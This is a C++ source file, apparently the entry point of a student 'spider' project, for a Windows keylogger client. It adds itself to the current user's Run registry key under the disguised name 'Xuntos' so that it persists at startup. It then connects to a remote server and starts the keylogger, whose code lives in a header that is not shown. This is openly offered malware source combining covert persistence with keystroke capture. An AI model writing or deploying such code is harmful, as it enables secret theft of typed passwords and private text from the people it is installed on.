//
//	Created by hugo.baladssin@epitech.eu on 27/09/17
//

#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>
#include <Windowsx.h>
#include <sstream>

#include "macros.h"
#include "Keylogger.h"

bool		running;
spider::client::Keylogger	keylog;

void		closeHkey(HKEY hKey)
{
	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}
}

BOOL		RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY	hKey = NULL;
	LONG	lResult = 0;
	BOOL	fSuccess = TRUE;
	DWORD	dwSize;

	const size_t	count = MAX_PATH * 2;
	wchar_t			szValue[count] = {};

	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
							  0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	closeHkey(hKey);

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t pathToExe[MAX_PATH];

	if (GetModuleFileNameW(NULL, pathToExe, MAX_PATH) != ERROR_INSUFFICIENT_BUFFER)
		RegisterMyProgramForStartup(L"Xuntos", pathToExe, NULL);
}

int WINAPI	WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,
	LPSTR cmdline, int ncmdshow)
{
	MSG		msg;

	RegisterProgram();
	keylog.connectToServer();

	keylog.init();

	running = true;
	while (running) {
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}